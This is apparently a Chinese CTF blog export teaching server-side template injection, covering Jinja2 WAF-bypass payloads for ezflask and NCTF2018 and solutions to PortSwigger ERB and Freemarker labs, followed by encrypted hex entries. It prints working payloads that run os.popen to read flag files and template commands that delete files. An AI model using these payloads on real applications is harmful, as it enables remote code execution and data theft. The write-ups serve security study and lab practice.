| [`center()`](https://jinja.palletsprojects.com/en/master/templates/#center) | [`indent()`](https://jinja.palletsprojects.com/en/master/templates/#indent) | [`pprint()`](https://jinja.palletsprojects.com/en/master/templates/#pprint) | [`slice()`](https://jinja.palletsprojects.com/en/master/templates/#slice) | [`upper()`](https://jinja.palletsprojects.com/en/master/templates/#upper) |
| [`default()`](https://jinja.palletsprojects.com/en/master/templates/#default) | [`int()`](https://jinja.palletsprojects.com/en/master/templates/#int) | [`random()`](https://jinja.palletsprojects.com/en/master/templates/#random) | [`sort()`](https://jinja.palletsprojects.com/en/master/templates/#sort) | [`urlencode()`](https://jinja.palletsprojects.com/en/master/templates/#urlencode) |
| [`dictsort()`](https://jinja.palletsprojects.com/en/master/templates/#dictsort) | [`join()`](https://jinja.palletsprojects.com/en/master/templates/#join) | [`reject()`](https://jinja.palletsprojects.com/en/master/templates/#reject) | [`string()`](https://jinja.palletsprojects.com/en/master/templates/#string) | [`urlize()`](https://jinja.palletsprojects.com/en/master/templates/#urlize) |
| [`escape()`](https://jinja.palletsprojects.com/en/master/templates/#escape) | [`last()`](https://jinja.palletsprojects.com/en/master/templates/#last) | [`rejectattr()`](https://jinja.palletsprojects.com/en/master/templates/#rejectattr) | [`striptags()`](https://jinja.palletsprojects.com/en/master/templates/#striptags) | [`wordcount()`](https://jinja.palletsprojects.com/en/master/templates/#wordcount) |
| [`filesizeformat()`](https://jinja.palletsprojects.com/en/master/templates/#filesizeformat) | [`length()`](https://jinja.palletsprojects.com/en/master/templates/#length) | [`replace()`](https://jinja.palletsprojects.com/en/master/templates/#replace) | [`sum()`](https://jinja.palletsprojects.com/en/master/templates/#sum) | [`wordwrap()`](https://jinja.palletsprojects.com/en/master/templates/#wordwrap) |
| [`first()`](https://jinja.palletsprojects.com/en/master/templates/#first) | [`list()`](https://jinja.palletsprojects.com/en/master/templates/#list) | [`reverse()`](https://jinja.palletsprojects.com/en/master/templates/#reverse) | [`title()`](https://jinja.palletsprojects.com/en/master/templates/#title) | [`xmlattr()`](https://jinja.palletsprojects.com/en/master/templates/#xmlattr) |

可以自行点击每个过滤器去查看每一种过滤器的作用。我们就是利用这些过滤器，一步步的拼接出我们想要的字符、数字或字符串。

### 常用字符获取入口点

- 对于获取一般字符的方法有以下几种：

&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;&#123;% set org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;&#123;% set org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;&#123;% set org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;

如下演示：

&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;

可以通过上面获取到的 `` 字符串获取的字符有：尖号、字母、空格、下划线和数字。

&#123;% set org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;

如上图所示，可以通过 `` 字符串获取的字符有：尖号、字母和空格。

&#123;% set org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;

可以通过上面获取到的除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符

&#123;% set org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;

可获得到的字符更多了。

- 对于获取数字，除了上面出现的那几种外我们还可以有以下几种方法：

&#123;% set num = (self|int) %&#125;&#123;&#123;num&#125;&#125;    # 0, 通过int过滤器获取数字&#123;% set num = (self|string|length) %&#125;&#123;&#123;num&#125;&#125;    # 24, 通过length过滤器获取数字&#123;% set point = self|float|string|min %&#125;    # 通过float过滤器获取点 .&#123;% set num = (True|int) %&#125;         #得到1

比如：`code=&#123;% set a='aaaaaaaaaaa'|length*'aa'|length*'aaaaaaa'|length %&#125;&#123;&#123;a&#125;&#125;得到154
有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。
[2020 DASCTF 八月安恒月赛]ezflask题目源码：
#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directoryapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    def safe_jinja(s):        blacklist = [&#x27;class&#x27;, &#x27;attr&#x27;, &#x27;mro&#x27;, &#x27;base&#x27;,                     &#x27;request&#x27;, &#x27;session&#x27;, &#x27;+&#x27;, &#x27;add&#x27;, &#x27;chr&#x27;, &#x27;ord&#x27;, &#x27;redirect&#x27;, &#x27;url_for&#x27;, &#x27;config&#x27;, &#x27;builtins&#x27;, &#x27;get_flashed_messages&#x27;, &#x27;get&#x27;, &#x27;subclasses&#x27;, &#x27;form&#x27;, &#x27;cookies&#x27;, &#x27;headers&#x27;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;&#123;&#125;&#x27;]        flag = True        for no in blacklist:            if no.lower() in s.lower():                flag = False                break        return flag    if not request.args.get(&#x27;name&#x27;):        return open(__file__).read()    elif safe_jinja(request.args.get(&#x27;name&#x27;)):        name = request.args.get(&#x27;name&#x27;)    else:        name = &#x27;wendell&#x27;    template = &#x27;&#x27;&#x27;    &lt;div class=&quot;center-content&quot;&gt;        &lt;p&gt;Hello, %s&lt;/p&gt;    &lt;/div&gt;    &lt;!--flag in /flag--&gt;    &lt;!--python3.8--&gt;&#x27;&#x27;&#x27; % (name)    return render_template_string(template)if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)

可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。
在存在ssti的地方执行如下payload：
&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;# 或 &#123;% set org = (&#123; &#125;|select|string) %&#125;&#123;&#123;org&#125;&#125;


可以看到，我们得到了一段字符串：&lt;generator object select_or_reject at 0x7f06771f4150&gt;，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 &lt;generator object select_or_reject at 0x7f06771f4150&gt; 这个字符串中取到我们想要的字符，从而绕过过滤。
然后我们在使用list()过滤器将字符串转化为列表：
&#123;% set orglst = (&#123; &#125;|select|string|list) %&#125;&#123;&#123;orglst&#125;&#125;


如上图所示，反回了一个列表，列表中是 &lt;generator object select_or_reject at 0x7f06771f4150&gt; 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 _：
&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125;    # _


同理还能取到更多的字符：
&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;&#123;&#123;spa&#125;&#125;    # 空格&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125;    # _&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;&#123;&#123;zero&#125;&#125;    # 0&#123;% set seven = ((&#123; &#125;|select|string|list).pop(40)|int) %&#125;&#123;&#123;seven&#125;&#125;    # 7......

这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：
&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;    # 0&#123;% set one = (zero**zero)|int %&#125;&#123;&#123;one&#125;&#125;    # 1&#123;%set two = (zero-one-one)|abs %&#125;    # 2&#123;%set three = (zero-one-one-one)|abs %&#125;    # 3&#123;% set five = (two*two*two)-one-one-one %&#125;    # 5#  &#123;%set four = (one+three) %&#125;    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了......


通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：
# 首先构造出所需的数字:&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;    # 0&#123;% set one = (zero**zero)|int %&#125;    # 1&#123;% set two = (zero-one-one)|abs %&#125;    # 2&#123;% set four = (two*two)|int %&#125;    # 4&#123;% set five = (two*two*two)-one-one-one %&#125;    # 5&#123;% set seven = (zero-one-one-five)|abs %&#125;    # 7# 构造出所需的各种字符与字符串:&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;    # _&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;    # 空格&#123;% set point = ((app.__doc__|string|list).pop(26)|string) %&#125;    # .&#123;% set yin = ((app.__doc__|string|list).pop(195)|string) %&#125;    # 单引号 &#x27;&#123;% set left = ((app.__doc__|string|list).pop(189)|string) %&#125;    # 左括号 (&#123;% set right = ((app.__doc__|string|list).pop(200)|string) %&#125;    # 右括号 )&#123;% set c = dict(c=aa)|reverse|first %&#125;    # 字符 c&#123;% set bfh = self|string|urlencode|first %&#125;    # 百分号 %&#123;% set bfhc=bfh~c %&#125;    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接&#123;% set slas = bfhc%((four~seven)|int) %&#125;    # 使用%c构造斜杠 /，使用某种格式化操作（%c），这在很多编程语言中用于将一个整数转换为其对应的字符。在ASCII码表中，整数 47 对应的字符是斜杠（/）&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;    # builtins&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;    # import&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;    # popen&#123;% set os = dict(o=aa,s=dd)|join %&#125;    # os&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;    # cat&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;    # flag&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;    # eval&#123;% set red = dict(re=aa,ad=dd)|join %&#125;    # read&#123;% set bul = xhx*2~but~xhx*2 %&#125;    # __builtins__

将上面构造的字符或字符串拼接起来构造出 __import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()：
&#123;% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;

然后将上面构造的各种变量添加到SSTI万能payload里面就行了：
&#123;% for f,v in whoami.__init__.__globals__.items() %&#125;    # globals    &#123;% if f == bul %&#125;         &#123;% for a,b in v.items() %&#125;    # builtins            &#123;% if a == ev %&#125;    # eval                &#123;&#123;b(pld)&#125;&#125;    # eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)            &#123;% endif %&#125;        &#123;% endfor %&#125;    &#123;% endif %&#125;&#123;% endfor %&#125;

所以最终的payload为：
&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;&#123;% set one = (zero**zero)|int %&#125;&#123;% set two = (zero-one-one)|abs|int %&#125;&#123;% set four = (two*two)|int %&#125;&#123;% set five = (two*two*two)-one-one-one %&#125;&#123;% set seven = (zero-one-one-five)|abs %&#125;&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;&#123;% set point = ((app.__doc__|string|list).pop(26)|string) %&#125;&#123;% set yin = ((app.__doc__|string|list).pop(195)|string) %&#125;&#123;% set left = ((app.__doc__|string|list).pop(189)|string) %&#125;&#123;% set right = ((app.__doc__|string|list).pop(200)|string) %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh=self|string|urlencode|first %&#125;&#123;% set bfhc=bfh~c %&#125;&#123;% set slas = bfhc%((four~seven)|int) %&#125;&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;% set os = dict(o=aa,s=dd)|join %&#125;&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;&#123;% set red = dict(re=aa,ad=dd)|join %&#125;&#123;% set bul = xhx*2~but~xhx*2 %&#125;&#123;% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in whoami.__init__.__globals__.items() %&#125;&#123;% if f == bul %&#125;&#123;% for a,b in v.items() %&#125;&#123;% if a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;

拿去执行，成功执行命令并得到了flag
过滤了request和class这里除了用上面中括号或 |attr() 那几种方法外，我们还可以利用flask里面的session对象和config对象来逃逸这一姿势。
下面通过NCTF2018的两道flask题目来仔细讲解。
[NCTF2018]flask真香打开题目一看，是一个炫酷的demo演示，这种demo一般是没有啥东西好挖的。首先F12信息收集，发现Python版本是3.5.2，没有Web静态服务器。

随便点开第二个demo发现404了，这里注意到404界面是Flask提供的404界面，按照以往的经验，猜测这里存在SSTI注入。
先尝试简单的payload：


从这里可见，毫无疑问的存在SSTI漏洞了。
那么就来康康到底有没有WAF，有的话被过滤了哪些。经过一番测试，确实很多东西都被过滤了，而且是正则表达式直接匹配删去，无法嵌套绕过。不完整测试有以下：
configclassmroargsrequestopenevalbuiltinsimport

从这里来看，似乎已经完全无法下手了。因为request和class都被过滤掉了。
卡在这里以后，最好的办法就是去查Flask官方文档了。从Flask官方文档里，找到了session对象，经过测试没有被过滤。更巧的是，session一定是一个dict对象，因此我们可以通过键的方法访问相应的类。由于键是一个字符串，因此可以通过字符串拼接绕过。
python：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;]&#125;&#125;


访问到了类，我们就可以通过 __bases__ 来获取基类的元组，带上索引0就可以访问到相应的基类。由此一直向上我们就可以访问到最顶层的object基类了。（同样的，如果没有过滤config的话，我们还可以利用config来逃逸，方法与session的相同）
payload：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0]&#125;&#125;


有了对象基类，我们就可以通过访问 __subclasses__ 方法再实例化去访问所有的子类。同样使用字符串拼接绕过WAF，这样就实现沙箱逃逸了。
payload：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;ss__&#x27;]()&#125;&#125;


SSTI目的无非就是两个：文件读写、执行命令。因此我们核心应该放在file类和os类。而坑爹的是，Python3几乎换了个遍。因此这里得去看官方文档去找相应的基类的用处。
我还是从os库入手，直接搜索“os”，找到了 os._wrap_close 类，同样使用dict键访问的方法。猜大致范围得到了索引序号，我这里序号是312，
payload：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312]&#125;&#125;


我们调用它的 __init__ 函数将其实例化，然后用 __globals__ 查看其全局变量。
payload：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312].__init__.__globals__&#125;&#125;


眼又花了，但我们的目的很明显，就是要执行命令，于是直接搜索 “popen” 就可以了：

由于又是一个dict类型，我们调用的时候又可以使用字符串拼接，绕过open过滤。
后面顺理成章的，我们将命令字符串传入，实例化这个函数，然后直接调用read方法就可以了。
payload：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312].__init__.__globals__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;


&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312].__init__.__globals__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;cat /Th1s__is_S3cret&#x27;).read()&#125;&#125;


BP-Lab: Basic server-side template injection(ERB模板)题目要求：要解决实验问题，请查看 ERB 文档以了解如何执行任意代码，然后从 Carlos 的主目录中删除该 morale.txt 文件
首先在hacktricks上面搜索ERB，结果为：https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby
该语法 &lt;%= someExpression %&gt; 用于计算表达式并在页面上呈现结果，几种基本操作如下：

当点击第一个商品的时候，页面提示如下：

猜测存在ERB漏洞，于是开始尝试，首先输入 &lt;%= system(&quot;whoami&quot;) %&gt;，发现正在题目要求的Carols目录下面，于是我们执行第二个代码直接删除所需删除的文件：&lt;%= system(&quot;rm ./morale.txt&quot;) %&gt;，解决题目
BP-Lab: Basic server-side template injection(code context)(Tornado模板)题目要求：请查看 Tornado 文档以了解如何执行任意代码，然后从 Carlos 的主目录中删除该 morale.txt 文件
Tornado模板：https://ajinabraham.com/blog/server-side-template-injection-in-tornado
先进入一篇文章发表了一条评论，然后登录我的账户，更改网站希望使用您的全名、名字或昵称，更改完后刷新评论区发现名字会随着我的更改而改变，存在模板注入，抓包尝试一下：

发现评论区名字后面会跟着47，确认存在漏洞，接着操作

位于Carlos目录下，继续操作删除要求的文件：

BP-Lab: Basic server-side template injection using documentation(Freemarker模板)题目要求：请确定模板引擎并使用文档来了解如何执行任意代码，然后从 Carlos 的主目录中删除该 morale.txt 文件
我们先登录题目提供的账号，然后进入随便一个商品滑到最下面点击修改模板（英语版的），进入一个页面开始修改，改模板的语法是  $&#123;语句&#125;，如果我们的语句填入的是不存在的对象，保存后页面会报错，从报错信息中得到改模板为Freemarker，于是上hacktricks搜索相关漏洞（当然题目要求的是自己查阅文档解决，不是这样子的），得到如下结果：
其中，new() 可用于创建实现接口的 TemplateModel 任意 Java 对象，有一个名为 Execute 的类，可用于执行任意 shell 命令，开始构造：&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;id&quot;)&#125;，确定所处目录是Carlos，于是删除要求的文件：&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;rm ./morale.txt&quot;)&#125;，题目解决
Lab: Server-side template injection in an unknown language with a documented exploit题目要求：请确定模板引擎并在线查找可用于执行任意代码的文档漏洞，然后从 Carlos 的主目录中删除该 morale.txt 文件
进入实验室后我们先点击第一个商品，回显跟第一题一模一样，所以现在我们需要确定使用的是哪种模板，于是输入 $&#123;&#123;]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ssti</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>test</title>
    <url>/2024/09/20/test/</url>
    <content><![CDATA[
  bd25ed9264b080267271e137e33d0ce12d665d7bec0b13cb21733fd79087c17c8fea24e9c0b3f47bb8d42505d66c57b3ad3113d7192e5cc73bfe1d7333140361
  
    
      
      
        请输入密码
      
    
  

]]></content>
  </entry>
  <entry>
    <title>sql之Waf绕过原理</title>
    <url>/2025/07/08/sql%E4%B9%8BWaf%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[
  cd5699025e1016936ab721471ecd2fff10b375cd2a2a9023110763c65a9c8a1d4bfd6bea00c98829bb5ba5df05f3e04f2dcc3477da5964c42b23a52c690ce03d1d47343d09a19f5d89d3f83a275af3580d2c728972c789859853e4aca2b7b017b2e2ff0d77e0711c8347f96a9d6d4ec2fb426ce8f5a6e0bcdf5da645140f52369461df5fa2737ba46e55cd077808d6c4a8f7e1e3333b109fbba027d3ea5596cf94037d54665a5fb40458cb5090668e6165da12cf9929fb8a4aaa3be7427edea0c549e2c1965ae222fbe271a0442c9cfbee3df3805b33820f3d976ab799f2fdd45eaeb0a3d31acae8a2374fbf0c35ac99273d54e897babc366c6d65f5c3d13c7b3f56a4b7d662874b9ff207f15730bbfa0712b84c7305c293cc7bcf29f8ab28fac8f426889ac9bcc0afedb98da66c34d85c296e8afcff498b2b9339a1cee07379d9eb868570289b92c4f8ec2410971fbbc659e3d0897181088b0641fa088aa4933077bd10d1c8e609b20c4dcda4450330595161ebc6cacd13597571e2e079a53b086301f0f771b23e1c7851f5d1df8cbe5067ef0e302f933a535c6f613aea8ffa8494d1e737d4a6fb38bd5ea6a6c591be02e0193ab803ba089dc17ac71ff2ee4d7eb9922c92a6257efda7f4d443df839af1b08f82b0ccbaf1175ee20dfa9bd8df37276284f238d9896a64650144d396fca3f0f597de0396a1a91156d404af69d7f3007b683bb7547ae2d439713a53cc58c6b4e7408bfe34ae58fdb66f66f28a83aba0f3c2cf9948a212c699467036b37da3551c6ed48e1147b358a5c3eb0a4a6158627829d4823a97d6392e3a4c82e9cd0bf1112bbb92ddde9d0c05a352c1a113d91bd68b50a4209e375ef6a2b4e6bfe5de45c6af7f49af89292e14a95f36e9872dcbe64d1ec7cfd957aea092dc6a01d413d28cd0e6c6d90f75b25a5686606c74a45f028e31023a65a4ab9df05ba6ec9f4ee16e31b7151032a895272a9cdb1b4c88af6572dbd8d7f95cf71970870178663c0f70ae27637cdfd1d9136bb29e661214cddb7fd5ae48539af0da5ec5d197890bf10fba56db3b61dcf6766b0585b3b9444ae8bbddfda5f4f619a5cfc60c1091e7efad7fac83143e7265dbd4cb9dfc7e84d39e92a1c3d3b15f9068721f09911ff5ef13f118daf49ffa89af54e54504da9711b563e08fe1409f6fc04cd923446214d13239363f5df5901c9fabf40b1a1fdd3c7de1742aa517bb143a6750b85cd6a3fd3087dfece592657c3dfaeab5ad849210501209e809abb3278cf49e9996c50f3b420705388c5edc7120337483f4a9d32efe7636c4d49e5bdf2ff92d2771117765f3d3eb80e9352b952ec2bc674371948799c8fc33d4a03d7e3e42a30ddf568dbe9912313a1318d995886f9ee79ffdf5b66c9f652313d94432a4085e5353116f17505f9d51f9f8bb016afa663230e9c901184c7d31985d9464e5dbc01530e2a4dc07280c71a4f628358ea74cd803f4cc929c025bb55bf442fbcbae90c520cdcc16c7acc96ac49fda8a1d5ce7fd994088c3efdf4f22ce3c645de4b4e48570e2da76b1698a90a75d4a4581ed6cd4bbaafac80a8eec69866a32060ed308c6d1de540b453b91c1d9e5b56194225b21483e620041f6d1f5ff7e9ddafac6014fa0fb5f221a90cdfddf248b238db0dd278980717c20b216dc529365e7333fa5d71182cb0e604b95d263db89a1e33b028e0e18dde8c2e46ebdb52b2d7f7fc0e983385a49a2c5db74d1a7986cb169f12487f34d0f34e93c450a142d3f18fcc9e3401007df46c1f1f635a746293b3d5f4f44eb9f7f5c65c0830873fc34862f34abc49acd627d1f02cae8e6fa005de7a9d120a0a70694ac2f0abbb1134dc27d017a4ef2d805a0e30eb60ee7c81cb934b96c3dd9af0b9cd1a792a34bb083d7dee8aa3d5767d074b5fea58b384853cad1f2242870e5efac8b1b5c5c2f0d717ab3dadd5534b19966876e963994d78fe132a1eff88e1400e5257d94d9da83f14d866915a82eef6bf05c7920aa90e522a9925b60b1a5460f8af696c4b73f214b9585314bc6a56ac41f03ac08bb6c45bda5629507fe760c8f2a1df8ff027937edba75c9e8bb1e21ceb971fa71d96846c9037a18c8b373cce33e93e91ba69a1410e6cb18cbd8720448c11545e18dbe6f0d4bc7c313910c9fcbcbf96bf38d1b9284d67a1f64bb4fcef5b84cf38814d24e67e2f9f56f188f8cdce5f53b31d7c1e7c5bc9d229888dbf88d10b2aeefe6c67b5ae43298bfded215f5557756d9bdd51e363a04f2afa75490f144761d5616f73621ab03d47c26359e0b400cd86d93999520cf1653dd6d561c1be43d6b5371892977c30f5dc14939ba0fbfac737d9d0babcd6ce4c610257958f9079560a08aaa19cf08e40088e5d8d55fecc089216b6f3daee5fc53d6d04673aa6ba63087562e5d6392fbc7ec4bcda4299be208806e2e65bf75e8092d3d75e627fa241506997941bbda7430f99ef0136bce9027e0935145b793f2a14dd9767c65709f2d2cbd066455bd6a17fbd08cc22153a2f8b240ca34cd21bad98e2d88f0770f393d83dbf7da7c67e1ebcf9d31095576ed7ffd3752c1bb170e6e31f709dc0a8c97075cd5f3f7ebae2f15bffae1a65c72bbcba17f8351d31ff23f1e9e2b1885c78581e2b7918d1f99863fa3e12654016ec7eec1b1124e4a702366bcff7b5591dcccb5ee25fb070979e423965f25f59b4623b836f767aa32c5078c1e46066f6709490a37598fcfe426af341dc64b67f1c7b9ce457e537d58001563a513841d7b4f667f0173f6f3721e7f61565090962042082c2fb6c9927c75e4a547d3614402e59fcdf0298a519cedea358353ed15aa6e448f09783e0e7a7623692b52c96d2bb8b64791b1a96e43e89b04b868cf04156b0518866fb6151d8758a0be7c1f4a46981c631d7ab8a3956bf48cef7ee80daf2d18be14e6f2c9d0d2886f6fd8f903320d1bd01a6103e9c01da8318245469c07ff792c4a8f04846e954844c6d9ac337338c528896084d6f88677b77c4b268c0fa1e2e13ebae0c7dcc63c1f08db5f2f5041bfa9c8cfc678783eaa4649239c47f063d52cf83aef4340cd430dcf174f2df24b7b07f2af4751c07400ac195b98ffe8a0a29df3259c9ae59fa7add210a750488466e0ee62b85103273c9a6f02a1568b85e73abe149ecbea150fefa15e3214b7802aa5c889bd40997d766e266775ed725a38bbfd3d7ec1f5cda1a675f8c1868f6e7655e1c644587af827fe3496e8e3d807df08e45d27b54b69906b80c88c05ee51fa3cd238a70a92a9fc5ad6a789b69c24da1d2fb30d288c2e0145bb25118c20328a51e4acca302d32f454395294066b8983d6aa0ae613ba570b6ee5ea54eeb389a3dfb496d1e39576ceb1e50943c8862d4b87b9e7823558991040c8005122d5497639ffe6e243755bfb893e09a08107aacae39a547232fe51c735e7673e9544a502b4d34e10577d161cc792755ded10bc8b557879dffc305576c8238d2fa517a16593ef30ee6e00bbc3fe821f40868d1dc7daf0257a66715d31053a2cb32deb1930d7bd7e7b815e7a630b99b23b4352903c648c5ae027b0f54b0e58c0a46eb7694e2bc2e6b9f5c0de69220a458ad1919fd4fadb7296765dbc3f90a557fc4309eb7ec0b4e8c1e528b40e98217e0c650698c9964cc487b52326d87012badafd2515f3b7027222f46a6befa89449fc2df6a706969621eba79b4169eab28d51359f95d1e3e061d5c1851870ca066e720b0422ea1ba40b8d50c9c1a9d4a1937d255386b22aa75bc2a0f673895733df71ef31f1183d81e6e9f01dfeb076a0e09ff7e1ae22afe87ccf892bb79830b39ab978d568809f03287fb3a9e168452810b881d18b70b257b72759e1c174b08d9c3cb795c181fecd0fd7ae245accd2dfa60f0e9bc8be0b0c10ddc1c4939b8735810e02f3cbdafe0ce7d181bc70e2c1e6c61f3c60db4f72144ee0639480100126e4340ba396b26b76b15c19cc95bcd984b82a4730e49d13fd4129414db58f045d4b0e418ba6beaeb4adaf27e82fd97cd7e67dd07fe61e76c8f8ca9b9b553086dd6c0a4f03628d0c97077c51d915d15a644dcbebe8f847d56f6e5568ee1acfc64ce0d9a84d412b3ad478154ce58f5f09646a243a619f025b68c9a6fc6a6a08b42007c18e03d62b49294a3378043eb26633fb8a2150b08414e914a953dcb29c1d813448ca0990c01157a2a76842826cc856bf4888d1f0dbf6407c26558787780213bb2b58178614dfb90680a1554fd4c576965cd3bcacb508a506551af02c99897b188baf9314b19e20161e82ad57e3e1851794e329fbd92a80decef9b7adc465899d3cffd08dd20e0788d659729e197b55116be5e292842ae276b2168e9eafdd1c012734da86f40604f4714ac146f1d19672adb50674c8d8827ec7b6b9f4382d9172dfd8bc9fca961004c891f916c34594ef8c7336196123a1a06537794c413ec524d5813b9ab61591d6ce84e81b7e3b584d0a439bdeda45c9b4b5c5ffdf74e4c53882c951728a6f6e10302afee7f21912c5b1d6bcfd1a942d908607378fdebb48bdc72fb9fcf75e2993f9add84188fab67aa7480a40240ec43fcee25bec6ed0b74f2e48444f251823e947d7c42335d1604864834c4732859884f5d3dfbff0e368a29102bf2caf0616cc0bea96f5468d10e0f87a6005917322b16f572da6525f5b764410d2859a94131da6c55b557f72f0729b4a161c6917f179cb2362f8b8bf44f38f3a6f43eff853d7c9c693dc1e663fd4dab7aae1403f8ff77c361682a8388bf46e91726f011ca8cb52856ec8c91d557c60bcb7fc78d47cfeef247a9c20da12a011f59ae457b2bed5bf1a78e9d9c1b0d60d49c919410d54cc1f155f3c1658c89afd2dcd31dbea4c03a3e76e150aaabf88a4f4fa97373f877bf64ef521c3d2f9e8383827211b94eda186ba0516d416acc75bfca72a6190b2e4774ec9bf451c7799981d11bf21e5a20e2c06e42f9f797cf43b3997f65fd676ccc70ddf936cbc42b691379d008d4c09831a1c65c9810d7e89da93a223b39e342e329339a2619116889def4954f1a17f663c6081fe432288d07ddfe498b75f78ef4fd393f8f6d64571b6959a33618e90ccc40758b50a60c170a9029afab857c6d5c68b0e5760dfecba87700ecfd75833a537f07de26e7ec91d179fdc2d9e80745745f9cf42ef42181013d66248914479c1503f896052a910dec3c9ce5efc6897834098807c091c8ced1d30a6dbd3035396981c4e6e78aa446b5113c3f19ad50ab2dc7bd6d419f583f1b40c9e39a2c92803fa12b9cd99ebd18d2550b58e91e0228355be33dc21ec817e32b7af4dbd45aa4d2670971a0ff702c363a30f45545e31bc05cf15fc01de666a41f2bee84b5ccafd65afad6dcb6144e0588dd05207bd67d948cc9e75b7772242a0d249fd708c8e5304983193cd260927d62cf5b2ae13e78d3551854929c4e2789e236caa4b2dfdad9f88dac01cb7ea5ab99045f0788301e1d80ff6604226452a53efd668ca0ee1277cd157d9b6e7d784819ec8e15f371b82bf40171e0b935ce542b78858d3264fbd6f96f76a1554a508e71dfd0bc8aa5a0f894ac42bbcf5842a3e7f7f6a1a08719393d7afe89725051d353f3de69a2980059efdcace517f8bc85d4ccd95d851430b9294def4346a41f042faa35e8625799a70cc9226d986fd701d1932abc0ad21640a51fcf01a12b4aa7edfef56ac09e6d728c70f2e1b30e10e645682e